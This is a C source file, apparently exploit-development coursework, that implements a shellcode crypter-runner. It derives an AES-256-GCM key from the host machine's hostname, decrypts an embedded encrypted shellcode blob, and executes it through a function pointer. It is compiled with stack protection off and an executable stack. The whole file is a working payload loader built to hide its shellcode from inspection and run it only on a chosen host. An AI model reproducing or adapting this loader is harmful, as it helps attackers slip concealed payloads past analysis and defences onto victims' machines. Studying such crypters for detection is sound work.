/*
  Author: Kevin Kirsche
  Date: August 30, 2018
  Compile: gcc -o decrypt decrypt.c -lcrypto -lssl -fno-stack-protector -zexecstack
  Requires package (debian / ubuntu): openssl libssl-dev
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

void handleErrors()
{
  printf("Some error occured\n");
}

int decrypt(unsigned char *ciphertext, int ciphertext_len,
  unsigned char *tag, unsigned char *key, unsigned char *iv,
  unsigned char *plaintext)
{
  EVP_CIPHER_CTX *ctx;
  int len=0, plaintext_len=0, ret;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new()))
    handleErrors();

  /* Initialise the decryption operation. */
  if(!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
    handleErrors();

  /* Set IV length. Not necessary if this is 12 bytes (96 bits) */
  if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL))
    handleErrors();

  /* Initialise key and IV */
  if(!EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv)) handleErrors();

  /* Provide the message to be decrypted, and obtain the plaintext output.
   * EVP_DecryptUpdate can be called multiple times if necessary
   */
   while(plaintext_len<=ciphertext_len-16)
   {
     if(1!=EVP_DecryptUpdate(ctx, plaintext+plaintext_len, &len, ciphertext+plaintext_len, 16))
       handleErrors();
    
     plaintext_len+=len;
   }
   if(1!=EVP_DecryptUpdate(ctx, plaintext+plaintext_len, &len, ciphertext+plaintext_len, ciphertext_len-plaintext_len))
      handleErrors();
   plaintext_len+=len;

  /* Set expected tag value. Works in OpenSSL 1.0.1d and later */
  if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag))
    handleErrors();

  /* Finalise the decryption. A positive return value indicates success,
   * anything else is a failure - the plaintext is not trustworthy.
   */
  ret = EVP_DecryptFinal_ex(ctx, plaintext + plaintext_len, &len);

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  if(ret > 0)
  {
    /* Success */
    plaintext_len += len;
    return plaintext_len;
  }
  else
  {
    /* Verify failed */
    return -1;
  }
}


int main (int argc, char **argv)
{
  // insert variables from encrypt script
  unsigned char iv[] = "\xc4\x7a\x03\xb3\xda\x91\xf4\x35\xc9\xc7\x06\x82\xe1\x98\x7f\x9a";
  unsigned char encrypted_shellcode[] = "\x11\x8a\x05\x3b\x7c\xae\xba\x4d\xc2\xb0\x36\x28\x65\x32\x66\xb5\x61\x08\x00\xe4\x79\xd9\xc7\x06\x68";
  int encrypted_shellcode_len = 25;
  unsigned char tag[] = "\xdd\x25\xf2\x6a\x88\x1f\xe3\xdf\x32\xb6\x6a\x94\xaf\xf1\x0e\x6c";
  // constant, don't change below
  unsigned char key[32],pt[1024+EVP_MAX_BLOCK_LENGTH];
  int k;
  int counter;

  /* the hostname is the key! */
  gethostname(key, 32);

  /* generate encryption key from user entered key */
  if(!PKCS5_PBKDF2_HMAC_SHA1(key, strlen(key),NULL,0,1000,32,key))
  {
    printf("Error in key generation\n");
    exit(1);
  }

  /* decrypt the text and print on STDOUT */
  k = decrypt(encrypted_shellcode, encrypted_shellcode_len, tag, key, iv, pt);
  if (k > 0) {
    pt[k]='\0';
    int (*ret)() = (int(*)())pt;
    ret();
  } else {
    printf("error decrypting. Tampering may have occurred\n");
  }
  return 0;
}
